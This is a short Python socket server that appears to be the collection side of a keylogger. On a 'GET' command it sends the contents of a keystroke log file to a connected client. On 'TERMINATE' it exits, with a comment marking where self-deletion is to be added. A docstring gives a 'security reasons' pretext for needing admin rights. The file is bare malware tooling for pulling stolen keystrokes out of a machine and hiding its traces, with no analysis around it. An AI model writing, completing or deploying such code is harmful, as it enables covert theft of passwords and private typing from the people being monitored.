import socket, sys

'''
This program must be run as admin for security reasons.
'''

HOST = '127.0.0.1'
PORT = 5001

command = ''

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    # allow TCP socket port to be reused indefinitely (otherwise, port is left occupied on program exit)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))

    while True:

        # wait for a connection from the client
        s.listen()
        conn, addr = s.accept()

        with conn:
            print('\nConnected by client', addr, '\n')

            while True:

                # wait for data from the client
                data = conn.recv(1024)
                command = data.decode('utf-8')
                print('Command from client:', command)

                if not data:
                    break
                elif command == 'TERMINATE':
                    # ADD SELF-DELETE HERE
                    sys.exit()
                elif command == 'GET':
                    with open('keylog_test.txt', 'r', encoding='utf-8') as f:
                        lns = f.read()
                        conn.sendall(lns.encode('utf-8'))
                        msg = '[GET_COMPLETE]'.encode('utf-8')
                        print("Sending transmission-ender ", msg)
                        conn.sendall(msg)
